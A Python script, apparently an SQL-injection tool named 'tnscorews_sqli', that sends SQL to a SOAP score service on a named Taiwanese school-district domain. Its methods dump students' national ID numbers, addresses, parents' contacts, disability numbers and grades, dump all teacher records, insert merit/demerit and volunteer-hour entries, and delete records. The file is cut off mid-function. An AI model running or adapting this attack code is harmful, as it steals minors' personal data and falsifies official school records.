import requests
import xml.etree.ElementTree as ET
from datetime import datetime

def Get_Current_Time_As_SQL_DateTime():
    current_time = datetime.now()
    formatted_time = current_time.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]
    return formatted_time

class tnscorews_sqli:
    def __init__(self):
        self.url = "https://jh.tn.edu.tw/tnNewscorews/score.asmx"
        self.headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": "http://localhost/tnscorews/get_class_course_list" #http://tempuri.org/GetMaxEvid
        } 
    
    def Get_Student_Info_By_Name(self, name):
        res = self._send_sql_command(f"SELECT Std_Unicode AS Student_Unicode, 一下座號 AS Seat_Number_Grade_1, 一下班級 AS Class_Grade_1, 一下學年度 AS Academic_Year_Grade_1, 一上座號 AS Seat_Number_Grade_1_Up, 一上班級 AS Class_Grade_1_Up, 一上學年度 AS Academic_Year_Grade_1_Up, 二下座號 AS Seat_Number_Grade_2_Down, 二下班級 AS Class_Grade_2_Down, 二下學年度 AS Academic_Year_Grade_2_Down, 二上座號 AS Seat_Number_Grade_2_Up, 二上班級 AS Class_Grade_2_Up, 二上學年度 AS Academic_Year_Grade_2_Up, 入學資格 AS Admission_Qualification, 三下座號 AS Seat_Number_Grade_3_Down, 三下班級 AS Class_Grade_3_Down, 三下學年度 AS Academic_Year_Grade_3_Down, 三上座號 AS Seat_Number_Grade_3_Up, 三上班級 AS Class_Grade_3_Up, 三上學年度 AS Academic_Year_Grade_3_Up, 戶口遷入日期 AS Date_of_Residence_Transfer, 戶籍地址 AS Household_Registration_Address, 戶籍村里 AS Household_Registration_Village, 戶籍郵遞區號 AS Household_Registration_Postal_Code, 戶籍鄉鎮市區 AS Household_Registration_Township_City, 戶籍路 AS Household_Registration_Road, 戶籍鄰 AS Household_Registration_Neighborhood, 戶籍縣市 AS Household_Registration_County_City, 父親出生年 AS Father_Birth_Year, 父親存歿 AS Father_Living_Status, 父親行動電話 AS Father_Cell_Phone, 父親姓名 AS Father_Name, 父親服務單位 AS Father_Service_Unit, 父親電子郵件 AS Father_Email, 父親電話公 AS Father_Phone_Work, 父親電話宅 AS Father_Phone_Home, 父親職業別 AS Father_Occupation_Type, 父親職稱 AS Father_Position, 出生地 AS Place_of_Birth, 出生年月日 AS Date_of_Birth, 母親出生年 AS Mother_Birth_Year, 母親存歿 AS Mother_Living_Status, 母親行動電話 AS Mother_Cell_Phone, 母親姓名 AS Mother_Name, 母親服務單位 AS Mother_Service_Unit, 母親電子郵件 AS Mother_Email, 母親電話公 AS Mother_Phone_Work, 母親電話宅 AS Mother_Phone_Home, 母親職業別 AS Mother_Occupation_Type, 母親職稱 AS Mother_Position, 在家自學 AS Homeschooled, 在學狀態 AS Enrollment_Status, 血型 AS Blood_Type, 身分證號碼 AS ID_Number, 身心障礙核准編號 AS Disability_Approval_Number, 性別 AS Gender, 特殊身分編號 AS Special_Identity_Number, 特殊班上課性質 AS Special_Class_Type, 特殊班班別 AS Special_Class_Class, 特殊班類別 AS Special_Class_Category, 班級性質 AS Class_Property, 國籍 AS Nationality, 族群 AS Ethnicity, 現在年級 AS Current_Grade, 現在座號 AS Current_Seat_Number, 現在班級 AS Current_Class, 畢修業日期 AS Graduation_Date, 畢修業字 AS Graduation_Letter, 畢修業別 AS Graduation_Type, 畢修業核准日期 AS Graduation_Approval_Date, 畢修業核准字 AS Graduation_Approval_Letter, 畢修業核准單位 AS Graduation_Approval_Unit, 畢修業核准號 AS Graduation_Approval_Number, 畢修業填報日期 AS Graduation_Report_Date, 畢修業號 AS Graduation_Number, 畢業小學代碼 AS Primary_School_Code, 畢業小學校名 AS Primary_School_Name, 通訊地址 AS Mailing_Address, 通訊村里 AS Mailing_Village, 通訊郵遞區號 AS Mailing_Postal_Code, 通訊鄉鎮市區 AS Mailing_Township_City, 通訊路 AS Mailing_Road, 通訊鄰 AS Mailing_Neighborhood, 通訊縣市 AS Mailing_County_City, 僑居地 AS Overseas_Residence, 監護人行動電話 AS Guardian_Cell_Phone, 監護人姓名 AS Guardian_Name, 監護人服務單位 AS Guardian_Service_Unit, 監護人電子郵件 AS Guardian_Email, 監護人電話公 AS Guardian_Phone_Work, 監護人電話宅 AS Guardian_Phone_Home, 監護人職業別 AS Guardian_Occupation_Type, 監護人職稱 AS Guardian_Position, 與父親關係 AS Relationship_with_Father, 與母親關係 AS Relationship_with_Mother, 與監護人關係 AS Relationship_with_Guardian, 與聯絡人關係 AS Relationship_with_Contact, 學生身份別 AS Student_Identity, 學生姓名 AS Student_Name, 學生英文姓名 AS Student_English_Name, 學校代碼 AS School_Code, 學號 AS Student_ID, 學籍異動者 AS Student_Status_Changer, 學籍異動時間 AS Student_Status_Change_Time, 聯絡人行動電話 AS Contact_Cell_Phone, 聯絡人姓名 AS Contact_Name, 聯絡人電子郵件 AS Contact_Email, 聯絡人電話公 AS Contact_Phone_Work, 聯絡人電話宅 AS Contact_Phone_Home, 證照種類 AS License_Type FROM dbo.學籍資料 WHERE 學生姓名 = '{name}';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]

    def Get_Student_Info_By_Sch_And_Name(self, sch_code, name):
        res = self._send_sql_command(f"SELECT Std_Unicode AS Student_Unicode, 一下座號 AS Seat_Number_Grade_1, 一下班級 AS Class_Grade_1, 一下學年度 AS Academic_Year_Grade_1, 一上座號 AS Seat_Number_Grade_1_Up, 一上班級 AS Class_Grade_1_Up, 一上學年度 AS Academic_Year_Grade_1_Up, 二下座號 AS Seat_Number_Grade_2_Down, 二下班級 AS Class_Grade_2_Down, 二下學年度 AS Academic_Year_Grade_2_Down, 二上座號 AS Seat_Number_Grade_2_Up, 二上班級 AS Class_Grade_2_Up, 二上學年度 AS Academic_Year_Grade_2_Up, 入學資格 AS Admission_Qualification, 三下座號 AS Seat_Number_Grade_3_Down, 三下班級 AS Class_Grade_3_Down, 三下學年度 AS Academic_Year_Grade_3_Down, 三上座號 AS Seat_Number_Grade_3_Up, 三上班級 AS Class_Grade_3_Up, 三上學年度 AS Academic_Year_Grade_3_Up, 戶口遷入日期 AS Date_of_Residence_Transfer, 戶籍地址 AS Household_Registration_Address, 戶籍村里 AS Household_Registration_Village, 戶籍郵遞區號 AS Household_Registration_Postal_Code, 戶籍鄉鎮市區 AS Household_Registration_Township_City, 戶籍路 AS Household_Registration_Road, 戶籍鄰 AS Household_Registration_Neighborhood, 戶籍縣市 AS Household_Registration_County_City, 父親出生年 AS Father_Birth_Year, 父親存歿 AS Father_Living_Status, 父親行動電話 AS Father_Cell_Phone, 父親姓名 AS Father_Name, 父親服務單位 AS Father_Service_Unit, 父親電子郵件 AS Father_Email, 父親電話公 AS Father_Phone_Work, 父親電話宅 AS Father_Phone_Home, 父親職業別 AS Father_Occupation_Type, 父親職稱 AS Father_Position, 出生地 AS Place_of_Birth, 出生年月日 AS Date_of_Birth, 母親出生年 AS Mother_Birth_Year, 母親存歿 AS Mother_Living_Status, 母親行動電話 AS Mother_Cell_Phone, 母親姓名 AS Mother_Name, 母親服務單位 AS Mother_Service_Unit, 母親電子郵件 AS Mother_Email, 母親電話公 AS Mother_Phone_Work, 母親電話宅 AS Mother_Phone_Home, 母親職業別 AS Mother_Occupation_Type, 母親職稱 AS Mother_Position, 在家自學 AS Homeschooled, 在學狀態 AS Enrollment_Status, 血型 AS Blood_Type, 身分證號碼 AS ID_Number, 身心障礙核准編號 AS Disability_Approval_Number, 性別 AS Gender, 特殊身分編號 AS Special_Identity_Number, 特殊班上課性質 AS Special_Class_Type, 特殊班班別 AS Special_Class_Class, 特殊班類別 AS Special_Class_Category, 班級性質 AS Class_Property, 國籍 AS Nationality, 族群 AS Ethnicity, 現在年級 AS Current_Grade, 現在座號 AS Current_Seat_Number, 現在班級 AS Current_Class, 畢修業日期 AS Graduation_Date, 畢修業字 AS Graduation_Letter, 畢修業別 AS Graduation_Type, 畢修業核准日期 AS Graduation_Approval_Date, 畢修業核准字 AS Graduation_Approval_Letter, 畢修業核准單位 AS Graduation_Approval_Unit, 畢修業核准號 AS Graduation_Approval_Number, 畢修業填報日期 AS Graduation_Report_Date, 畢修業號 AS Graduation_Number, 畢業小學代碼 AS Primary_School_Code, 畢業小學校名 AS Primary_School_Name, 通訊地址 AS Mailing_Address, 通訊村里 AS Mailing_Village, 通訊郵遞區號 AS Mailing_Postal_Code, 通訊鄉鎮市區 AS Mailing_Township_City, 通訊路 AS Mailing_Road, 通訊鄰 AS Mailing_Neighborhood, 通訊縣市 AS Mailing_County_City, 僑居地 AS Overseas_Residence, 監護人行動電話 AS Guardian_Cell_Phone, 監護人姓名 AS Guardian_Name, 監護人服務單位 AS Guardian_Service_Unit, 監護人電子郵件 AS Guardian_Email, 監護人電話公 AS Guardian_Phone_Work, 監護人電話宅 AS Guardian_Phone_Home, 監護人職業別 AS Guardian_Occupation_Type, 監護人職稱 AS Guardian_Position, 與父親關係 AS Relationship_with_Father, 與母親關係 AS Relationship_with_Mother, 與監護人關係 AS Relationship_with_Guardian, 與聯絡人關係 AS Relationship_with_Contact, 學生身份別 AS Student_Identity, 學生姓名 AS Student_Name, 學生英文姓名 AS Student_English_Name, 學校代碼 AS School_Code, 學號 AS Student_ID, 學籍異動者 AS Student_Status_Changer, 學籍異動時間 AS Student_Status_Change_Time, 聯絡人行動電話 AS Contact_Cell_Phone, 聯絡人姓名 AS Contact_Name, 聯絡人電子郵件 AS Contact_Email, 聯絡人電話公 AS Contact_Phone_Work, 聯絡人電話宅 AS Contact_Phone_Home, 證照種類 AS License_Type FROM dbo.學籍資料 WHERE 學校代碼 = '{sch_code}' AND 學生姓名 = '{name}';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]

    def Get_Subject_Grades_By_Sch_And_No(self, sch_code, std_no):
        res = self._send_sql_command(f"SELECT 學校代碼 AS sch_code, 學號 AS std_no, 學年別 AS academic_year, 學期別 AS by_semester, 語文_國文領域文字描述 AS lang_chinese_desc, 語文_國文領域時數 AS lang_chinese_hours, 語文_國文領域百分成績 AS lang_chinese_score, 語文_英文領域文字描述 AS lang_english_desc, 語文_英文領域時數 AS lang_english_hours, 語文_英文領域百分成績 AS lang_english_score, 數學領域文字描述 AS math_desc, 數學領域時數 AS math_hours, 數學領域百分成績 AS math_score, 自然領域文字描述 AS nature_desc, 自然領域時數 AS nature_hours, 自然領域百分成績 AS nature_score, 社會領域文字描述 AS social_desc, 社會領域時數 AS social_hours, 社會領域百分成績 AS social_score, 藝術領域文字描述 AS art_desc, 藝術領域時數 AS art_hours, 藝術領域百分成績 AS art_score, 健體領域文字描述 AS fitness_desc, 健體領域時數 AS fitness_hours, 健體領域百分成績 AS fitness_score, 綜合領域文字描述 AS integrated_domain_desc, 綜合領域時數 AS integrated_domain_hours, 綜合領域百分成績 AS integrated_score, 彈性課程科目名稱1 AS elective_course_name_1, 彈性課程時數1 AS elective_course_hours_1, 彈性課程科目百分成績1 AS elective_course_score_1, 彈性課程科目名稱2 AS elective_course_name_2, 彈性課程時數2 AS elective_course_hours_2, 彈性課程科目百分成績2 AS elective_course_score_2, 彈性課程科目名稱3 AS elective_course_name_3, 彈性課程時數3 AS elective_course_hours_3, 彈性課程科目百分成績3 AS elective_course_score_3, 彈性課程科目名稱4 AS elective_course_name_4, 彈性課程時數4 AS elective_course_hours_4, 彈性課程科目百分成績4 AS elective_course_score_4, 彈性課程科目名稱5 AS elective_course_name_5, 彈性課程時數5 AS elective_course_hours_5, 彈性課程科目百分成績5 AS elective_course_score_5, 彈性課程科目名稱6 AS elective_course_name_6, 彈性課程時數6 AS elective_course_hours_6, 彈性課程科目百分成績6 AS elective_course_score_6, 彈性課程科目名稱7 AS elective_course_name_7, 彈性課程時數7 AS elective_course_hours_7, 彈性課程科目百分成績7 AS elective_course_score_7, 彈性課程科目名稱8 AS elective_course_name_8, 彈性課程時數8 AS elective_course_hours_8, 彈性課程科目百分成績8 AS elective_course_score_8, 彈性課程科目名稱9 AS elective_course_name_9, 彈性課程時數9 AS elective_course_hours_9, 彈性課程科目百分成績9 AS elective_course_score_9, 彈性課程科目名稱10 AS elective_course_name_10, 彈性課程時數10 AS elective_course_hours_10, 彈性課程科目百分成績10 AS elective_course_score_10, 科技領域文字描述 AS technology_desc, 科技領域時數 AS technology_hours, 科技領域百分成績 AS technology_score, 本土語文領域文字描述 AS indigenous_language_desc, 本土語文領域時數 AS indigenous_language_hours, 本土語文領域百分成績 AS indigenous_language_score FROM dbo.領域成績 WHERE 學校代碼 = '{sch_code}' AND 學號 = '{std_no}'")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]
    
    def Get_Student_Info_By_Sch_And_No(self, sch_code, std_no):
        res = self._send_sql_command(f"SELECT Std_Unicode AS Student_Unicode, 一下座號 AS Seat_Number_Grade_1, 一下班級 AS Class_Grade_1, 一下學年度 AS Academic_Year_Grade_1, 一上座號 AS Seat_Number_Grade_1_Up, 一上班級 AS Class_Grade_1_Up, 一上學年度 AS Academic_Year_Grade_1_Up, 二下座號 AS Seat_Number_Grade_2_Down, 二下班級 AS Class_Grade_2_Down, 二下學年度 AS Academic_Year_Grade_2_Down, 二上座號 AS Seat_Number_Grade_2_Up, 二上班級 AS Class_Grade_2_Up, 二上學年度 AS Academic_Year_Grade_2_Up, 入學資格 AS Admission_Qualification, 三下座號 AS Seat_Number_Grade_3_Down, 三下班級 AS Class_Grade_3_Down, 三下學年度 AS Academic_Year_Grade_3_Down, 三上座號 AS Seat_Number_Grade_3_Up, 三上班級 AS Class_Grade_3_Up, 三上學年度 AS Academic_Year_Grade_3_Up, 戶口遷入日期 AS Date_of_Residence_Transfer, 戶籍地址 AS Household_Registration_Address, 戶籍村里 AS Household_Registration_Village, 戶籍郵遞區號 AS Household_Registration_Postal_Code, 戶籍鄉鎮市區 AS Household_Registration_Township_City, 戶籍路 AS Household_Registration_Road, 戶籍鄰 AS Household_Registration_Neighborhood, 戶籍縣市 AS Household_Registration_County_City, 父親出生年 AS Father_Birth_Year, 父親存歿 AS Father_Living_Status, 父親行動電話 AS Father_Cell_Phone, 父親姓名 AS Father_Name, 父親服務單位 AS Father_Service_Unit, 父親電子郵件 AS Father_Email, 父親電話公 AS Father_Phone_Work, 父親電話宅 AS Father_Phone_Home, 父親職業別 AS Father_Occupation_Type, 父親職稱 AS Father_Position, 出生地 AS Place_of_Birth, 出生年月日 AS Date_of_Birth, 母親出生年 AS Mother_Birth_Year, 母親存歿 AS Mother_Living_Status, 母親行動電話 AS Mother_Cell_Phone, 母親姓名 AS Mother_Name, 母親服務單位 AS Mother_Service_Unit, 母親電子郵件 AS Mother_Email, 母親電話公 AS Mother_Phone_Work, 母親電話宅 AS Mother_Phone_Home, 母親職業別 AS Mother_Occupation_Type, 母親職稱 AS Mother_Position, 在家自學 AS Homeschooled, 在學狀態 AS Enrollment_Status, 血型 AS Blood_Type, 身分證號碼 AS ID_Number, 身心障礙核准編號 AS Disability_Approval_Number, 性別 AS Gender, 特殊身分編號 AS Special_Identity_Number, 特殊班上課性質 AS Special_Class_Type, 特殊班班別 AS Special_Class_Class, 特殊班類別 AS Special_Class_Category, 班級性質 AS Class_Property, 國籍 AS Nationality, 族群 AS Ethnicity, 現在年級 AS Current_Grade, 現在座號 AS Current_Seat_Number, 現在班級 AS Current_Class, 畢修業日期 AS Graduation_Date, 畢修業字 AS Graduation_Letter, 畢修業別 AS Graduation_Type, 畢修業核准日期 AS Graduation_Approval_Date, 畢修業核准字 AS Graduation_Approval_Letter, 畢修業核准單位 AS Graduation_Approval_Unit, 畢修業核准號 AS Graduation_Approval_Number, 畢修業填報日期 AS Graduation_Report_Date, 畢修業號 AS Graduation_Number, 畢業小學代碼 AS Primary_School_Code, 畢業小學校名 AS Primary_School_Name, 通訊地址 AS Mailing_Address, 通訊村里 AS Mailing_Village, 通訊郵遞區號 AS Mailing_Postal_Code, 通訊鄉鎮市區 AS Mailing_Township_City, 通訊路 AS Mailing_Road, 通訊鄰 AS Mailing_Neighborhood, 通訊縣市 AS Mailing_County_City, 僑居地 AS Overseas_Residence, 監護人行動電話 AS Guardian_Cell_Phone, 監護人姓名 AS Guardian_Name, 監護人服務單位 AS Guardian_Service_Unit, 監護人電子郵件 AS Guardian_Email, 監護人電話公 AS Guardian_Phone_Work, 監護人電話宅 AS Guardian_Phone_Home, 監護人職業別 AS Guardian_Occupation_Type, 監護人職稱 AS Guardian_Position, 與父親關係 AS Relationship_with_Father, 與母親關係 AS Relationship_with_Mother, 與監護人關係 AS Relationship_with_Guardian, 與聯絡人關係 AS Relationship_with_Contact, 學生身份別 AS Student_Identity, 學生姓名 AS Student_Name, 學生英文姓名 AS Student_English_Name, 學校代碼 AS School_Code, 學號 AS Student_ID, 學籍異動者 AS Student_Status_Changer, 學籍異動時間 AS Student_Status_Change_Time, 聯絡人行動電話 AS Contact_Cell_Phone, 聯絡人姓名 AS Contact_Name, 聯絡人電子郵件 AS Contact_Email, 聯絡人電話公 AS Contact_Phone_Work, 聯絡人電話宅 AS Contact_Phone_Home, 證照種類 AS License_Type FROM dbo.學籍資料 WHERE 學校代碼 = '{sch_code}' AND 學號 = '{std_no}';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]
    
    def Get_Students_Info_By_Sch_And_Class(self, sch_code, grade, current_class):
        res = self._send_sql_command(f"SELECT Std_Unicode AS Student_Unicode, 一下座號 AS Seat_Number_Grade_1, 一下班級 AS Class_Grade_1, 一下學年度 AS Academic_Year_Grade_1, 一上座號 AS Seat_Number_Grade_1_Up, 一上班級 AS Class_Grade_1_Up, 一上學年度 AS Academic_Year_Grade_1_Up, 二下座號 AS Seat_Number_Grade_2_Down, 二下班級 AS Class_Grade_2_Down, 二下學年度 AS Academic_Year_Grade_2_Down, 二上座號 AS Seat_Number_Grade_2_Up, 二上班級 AS Class_Grade_2_Up, 二上學年度 AS Academic_Year_Grade_2_Up, 入學資格 AS Admission_Qualification, 三下座號 AS Seat_Number_Grade_3_Down, 三下班級 AS Class_Grade_3_Down, 三下學年度 AS Academic_Year_Grade_3_Down, 三上座號 AS Seat_Number_Grade_3_Up, 三上班級 AS Class_Grade_3_Up, 三上學年度 AS Academic_Year_Grade_3_Up, 戶口遷入日期 AS Date_of_Residence_Transfer, 戶籍地址 AS Household_Registration_Address, 戶籍村里 AS Household_Registration_Village, 戶籍郵遞區號 AS Household_Registration_Postal_Code, 戶籍鄉鎮市區 AS Household_Registration_Township_City, 戶籍路 AS Household_Registration_Road, 戶籍鄰 AS Household_Registration_Neighborhood, 戶籍縣市 AS Household_Registration_County_City, 父親出生年 AS Father_Birth_Year, 父親存歿 AS Father_Living_Status, 父親行動電話 AS Father_Cell_Phone, 父親姓名 AS Father_Name, 父親服務單位 AS Father_Service_Unit, 父親電子郵件 AS Father_Email, 父親電話公 AS Father_Phone_Work, 父親電話宅 AS Father_Phone_Home, 父親職業別 AS Father_Occupation_Type, 父親職稱 AS Father_Position, 出生地 AS Place_of_Birth, 出生年月日 AS Date_of_Birth, 母親出生年 AS Mother_Birth_Year, 母親存歿 AS Mother_Living_Status, 母親行動電話 AS Mother_Cell_Phone, 母親姓名 AS Mother_Name, 母親服務單位 AS Mother_Service_Unit, 母親電子郵件 AS Mother_Email, 母親電話公 AS Mother_Phone_Work, 母親電話宅 AS Mother_Phone_Home, 母親職業別 AS Mother_Occupation_Type, 母親職稱 AS Mother_Position, 在家自學 AS Homeschooled, 在學狀態 AS Enrollment_Status, 血型 AS Blood_Type, 身分證號碼 AS ID_Number, 身心障礙核准編號 AS Disability_Approval_Number, 性別 AS Gender, 特殊身分編號 AS Special_Identity_Number, 特殊班上課性質 AS Special_Class_Type, 特殊班班別 AS Special_Class_Class, 特殊班類別 AS Special_Class_Category, 班級性質 AS Class_Property, 國籍 AS Nationality, 族群 AS Ethnicity, 現在年級 AS Current_Grade, 現在座號 AS Current_Seat_Number, 現在班級 AS Current_Class, 畢修業日期 AS Graduation_Date, 畢修業字 AS Graduation_Letter, 畢修業別 AS Graduation_Type, 畢修業核准日期 AS Graduation_Approval_Date, 畢修業核准字 AS Graduation_Approval_Letter, 畢修業核准單位 AS Graduation_Approval_Unit, 畢修業核准號 AS Graduation_Approval_Number, 畢修業填報日期 AS Graduation_Report_Date, 畢修業號 AS Graduation_Number, 畢業小學代碼 AS Primary_School_Code, 畢業小學校名 AS Primary_School_Name, 通訊地址 AS Mailing_Address, 通訊村里 AS Mailing_Village, 通訊郵遞區號 AS Mailing_Postal_Code, 通訊鄉鎮市區 AS Mailing_Township_City, 通訊路 AS Mailing_Road, 通訊鄰 AS Mailing_Neighborhood, 通訊縣市 AS Mailing_County_City, 僑居地 AS Overseas_Residence, 監護人行動電話 AS Guardian_Cell_Phone, 監護人姓名 AS Guardian_Name, 監護人服務單位 AS Guardian_Service_Unit, 監護人電子郵件 AS Guardian_Email, 監護人電話公 AS Guardian_Phone_Work, 監護人電話宅 AS Guardian_Phone_Home, 監護人職業別 AS Guardian_Occupation_Type, 監護人職稱 AS Guardian_Position, 與父親關係 AS Relationship_with_Father, 與母親關係 AS Relationship_with_Mother, 與監護人關係 AS Relationship_with_Guardian, 與聯絡人關係 AS Relationship_with_Contact, 學生身份別 AS Student_Identity, 學生姓名 AS Student_Name, 學生英文姓名 AS Student_English_Name, 學校代碼 AS School_Code, 學號 AS Student_ID, 學籍異動者 AS Student_Status_Changer, 學籍異動時間 AS Student_Status_Change_Time, 聯絡人行動電話 AS Contact_Cell_Phone, 聯絡人姓名 AS Contact_Name, 聯絡人電子郵件 AS Contact_Email, 聯絡人電話公 AS Contact_Phone_Work, 聯絡人電話宅 AS Contact_Phone_Home, 證照種類 AS License_Type FROM dbo.學籍資料 WHERE 學校代碼 = '{sch_code}' AND 現在年級 = '{grade}' AND 現在班級 = '{current_class}' AND 在學狀態 = '0';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]
    
    def Get_Student_Info_By_Sch_And_Class_And_Seat(self, sch_code, grade, current_class, seat_number):
        res = self._send_sql_command(f"SELECT Std_Unicode AS Student_Unicode, 一下座號 AS Seat_Number_Grade_1, 一下班級 AS Class_Grade_1, 一下學年度 AS Academic_Year_Grade_1, 一上座號 AS Seat_Number_Grade_1_Up, 一上班級 AS Class_Grade_1_Up, 一上學年度 AS Academic_Year_Grade_1_Up, 二下座號 AS Seat_Number_Grade_2_Down, 二下班級 AS Class_Grade_2_Down, 二下學年度 AS Academic_Year_Grade_2_Down, 二上座號 AS Seat_Number_Grade_2_Up, 二上班級 AS Class_Grade_2_Up, 二上學年度 AS Academic_Year_Grade_2_Up, 入學資格 AS Admission_Qualification, 三下座號 AS Seat_Number_Grade_3_Down, 三下班級 AS Class_Grade_3_Down, 三下學年度 AS Academic_Year_Grade_3_Down, 三上座號 AS Seat_Number_Grade_3_Up, 三上班級 AS Class_Grade_3_Up, 三上學年度 AS Academic_Year_Grade_3_Up, 戶口遷入日期 AS Date_of_Residence_Transfer, 戶籍地址 AS Household_Registration_Address, 戶籍村里 AS Household_Registration_Village, 戶籍郵遞區號 AS Household_Registration_Postal_Code, 戶籍鄉鎮市區 AS Household_Registration_Township_City, 戶籍路 AS Household_Registration_Road, 戶籍鄰 AS Household_Registration_Neighborhood, 戶籍縣市 AS Household_Registration_County_City, 父親出生年 AS Father_Birth_Year, 父親存歿 AS Father_Living_Status, 父親行動電話 AS Father_Cell_Phone, 父親姓名 AS Father_Name, 父親服務單位 AS Father_Service_Unit, 父親電子郵件 AS Father_Email, 父親電話公 AS Father_Phone_Work, 父親電話宅 AS Father_Phone_Home, 父親職業別 AS Father_Occupation_Type, 父親職稱 AS Father_Position, 出生地 AS Place_of_Birth, 出生年月日 AS Date_of_Birth, 母親出生年 AS Mother_Birth_Year, 母親存歿 AS Mother_Living_Status, 母親行動電話 AS Mother_Cell_Phone, 母親姓名 AS Mother_Name, 母親服務單位 AS Mother_Service_Unit, 母親電子郵件 AS Mother_Email, 母親電話公 AS Mother_Phone_Work, 母親電話宅 AS Mother_Phone_Home, 母親職業別 AS Mother_Occupation_Type, 母親職稱 AS Mother_Position, 在家自學 AS Homeschooled, 在學狀態 AS Enrollment_Status, 血型 AS Blood_Type, 身分證號碼 AS ID_Number, 身心障礙核准編號 AS Disability_Approval_Number, 性別 AS Gender, 特殊身分編號 AS Special_Identity_Number, 特殊班上課性質 AS Special_Class_Type, 特殊班班別 AS Special_Class_Class, 特殊班類別 AS Special_Class_Category, 班級性質 AS Class_Property, 國籍 AS Nationality, 族群 AS Ethnicity, 現在年級 AS Current_Grade, 現在座號 AS Current_Seat_Number, 現在班級 AS Current_Class, 畢修業日期 AS Graduation_Date, 畢修業字 AS Graduation_Letter, 畢修業別 AS Graduation_Type, 畢修業核准日期 AS Graduation_Approval_Date, 畢修業核准字 AS Graduation_Approval_Letter, 畢修業核准單位 AS Graduation_Approval_Unit, 畢修業核准號 AS Graduation_Approval_Number, 畢修業填報日期 AS Graduation_Report_Date, 畢修業號 AS Graduation_Number, 畢業小學代碼 AS Primary_School_Code, 畢業小學校名 AS Primary_School_Name, 通訊地址 AS Mailing_Address, 通訊村里 AS Mailing_Village, 通訊郵遞區號 AS Mailing_Postal_Code, 通訊鄉鎮市區 AS Mailing_Township_City, 通訊路 AS Mailing_Road, 通訊鄰 AS Mailing_Neighborhood, 通訊縣市 AS Mailing_County_City, 僑居地 AS Overseas_Residence, 監護人行動電話 AS Guardian_Cell_Phone, 監護人姓名 AS Guardian_Name, 監護人服務單位 AS Guardian_Service_Unit, 監護人電子郵件 AS Guardian_Email, 監護人電話公 AS Guardian_Phone_Work, 監護人電話宅 AS Guardian_Phone_Home, 監護人職業別 AS Guardian_Occupation_Type, 監護人職稱 AS Guardian_Position, 與父親關係 AS Relationship_with_Father, 與母親關係 AS Relationship_with_Mother, 與監護人關係 AS Relationship_with_Guardian, 與聯絡人關係 AS Relationship_with_Contact, 學生身份別 AS Student_Identity, 學生姓名 AS Student_Name, 學生英文姓名 AS Student_English_Name, 學校代碼 AS School_Code, 學號 AS Student_ID, 學籍異動者 AS Student_Status_Changer, 學籍異動時間 AS Student_Status_Change_Time, 聯絡人行動電話 AS Contact_Cell_Phone, 聯絡人姓名 AS Contact_Name, 聯絡人電子郵件 AS Contact_Email, 聯絡人電話公 AS Contact_Phone_Work, 聯絡人電話宅 AS Contact_Phone_Home, 證照種類 AS License_Type FROM dbo.學籍資料 WHERE 學校代碼 = '{sch_code}' AND 現在年級 = '{grade}' AND 現在班級 = '{current_class}' AND 現在座號 = '{seat_number}' AND 在學狀態 = '0';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]

    def Get_All_Teacher(self):
        res = self._send_sql_command(f"SELECT * FROM dbo.教師基本資料;")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]

    def Add_Volunteer(self, sch_code, std_no, sch_year, sch_term, hours, service_contents, writer_id_no, writer_name, writingtime = "2023-06-27T13:37:09.77"):
        return tnsqli._send_sql_command(f"INSERT INTO dbo.edu12_Volunteer_Add_Rec (sch_code, std_no, sch_year, sch_term, hours, service_contents, writingtime, writer_id_no, writer_name) VALUES ('{sch_code}', '{std_no}', '{sch_year}', '{sch_term}', '{hours}', '{service_contents}', CONVERT(DATETIME, '{writingtime}'), '{writer_id_no}', '{writer_name}');")

    def Get_Volunteer(self, sch_code, std_no):
        res = self._send_sql_command(f"SELECT * FROM dbo.edu12_Volunteer_Add_Rec WHERE sch_code = '{sch_code}' AND std_no = '{std_no}';")
        root = ET.fromstring(res)

        return root[0][0][0][1][0]
    
    def Remove_Volunteer_By_Id(self, addrec_id):
        return tnsqli._send_sql_command(f"DELETE FROM dbo.edu12_Volunteer_Add_Rec WHERE addrec_id = {addrec_id};")

    def Add_MD(self, sch_code, std_no, sch_year, sch_term, merit_demerit_type, tiny_count, middle_count, grand_count, reason, basis_of, sort_tag = "無", rec_day = "2023-06-27T13:37:09.77"):
        return tnsqli._send_sql_command(f"INSERT INTO dbo.Merit_Demerit_Rec (sch_code, std_no, sch_year, sch_term, rec_day, merit_demerit_type, tiny_count, middle_count, grand_count, reason, basis_of, sort_tag) VALUES ('{sch_code}', '{std_no}', '{sch_year}', '{sch_term}', CONVERT(DATETIME, '{rec_day}'), '{merit_demerit_type}', {tiny_count}, '{middle_count}', '{grand_count}', '{reason}', '{basis_of}', '{sort_tag}');")

    def Add_Student_Info(self, student_name, seat_number_grade_1, class_grade_1, academic_year_grade_1, seat_number_grade_1_up, class_grade_1_up, academic_year_grade_1_up, seat_number_grade_2_down, class_grade_2_down, academic_year_grade_2_down, seat_number_grade_2_up, class_grade_2_up, academic_year_grade_2_up, admission_qualification, seat_number_grade_3_down, class_grade_3_down, academic_year_grade_3_down, seat_number_grade_3_up, class_grade_3_up, academic_year_grade_3_up, date_of_residence_transfer, household_registration_address, household_registration_village, household_registration_postal_code, household_registration_township_city, household_registration_road, household_registration_neighborhood, household_registration_county_city, father_birth_year, father_living_status, father_cell_phone, father_name, father_service_unit, father_email, father_phone_work, father_phone_home, father_occupation_type, father_position, place_of_birth, date_of_birth, mother_birth_year, mother_living_status, mother_cell_phone, mother_name, mother_service_unit, mother_email, mother_phone_work, mother_phone_home, mother_occupation_type, mother_position, homeschooled, enrollment_status, blood_type, id_number, disability_approval_number, gender, special_identity_number, special_class_type, special_class_class, special_class_category, class_property, nationality, ethnicity, current_grade, current_seat_number, current_class, graduation_date, graduation_letter, graduation_type, graduation_approval_date, graduation_approval_letter, graduation_approval_unit, graduation_approval_number, graduation_report_date, graduation_number, primary_school_code, primary_school_name, mailing_address, mailing_village, mailing_postal_code, mailing_township_city, mailing_road, mailing_neighborhood, mailing_county_city, overseas_residence, guardian_cell_phone, guardian_name, guardian_service_unit, guardian_email, guardian_phone_work, guardian_phone_home, guardian_occupation_type, guardian_position, relationship_with_father, relationship_with_mother, relationship_with_guardian, 